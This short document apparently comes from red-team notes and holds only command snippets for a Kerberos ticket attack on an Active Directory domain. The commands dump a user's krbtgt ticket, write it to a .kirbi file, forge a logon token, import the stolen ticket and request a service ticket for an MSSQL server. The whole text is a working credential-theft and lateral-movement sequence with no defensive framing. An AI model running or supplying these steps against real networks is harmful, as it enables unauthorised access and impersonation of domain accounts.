```
krb_dump /user:rsteel /service:krbtgt
```

```
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\admin.kirbi", [Convert]::FromBase64String("[B64 TICKET]"))
```

```
make_token CONTOSO\admin FakePass
```

```
kerberos_ticket_use C:\Users\Attacker\Desktop\admin.kirbi
```

WE CAN ASK TGS TOO.

```
krb_asktgs /service:MSSQLSvc/lon-db-1.contoso.com:1433 /ticket:[TICKET]
```